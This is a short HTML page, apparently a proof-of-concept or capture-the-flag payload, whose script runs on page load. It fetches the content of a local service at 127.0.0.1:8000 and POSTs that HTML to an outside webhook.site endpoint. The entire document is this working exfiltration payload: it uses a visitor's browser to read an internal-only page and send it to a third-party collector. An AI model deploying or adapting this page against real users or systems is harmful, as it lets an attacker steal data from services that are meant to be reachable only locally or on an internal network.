<!DOCTYPE html>
<html>
<head>
<title>a</title>
</head>
<body>
<script>

fetch('http://127.0.0.1:8000')
  .then(response => response.text())
  .then(html => {
    // Send the HTML to a webhook
    return fetch('https://20c77f7e-26f0-4929-ac86-63e0c1a31a0e.webhook.site', {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain',
      },
      body: html
    });
  })
  .then(response => {
    console.log('HTML sent to webhook successfully');
  })
  .catch(error => {
    console.error('Error:', error);
  });
</script>
</body>
</html>
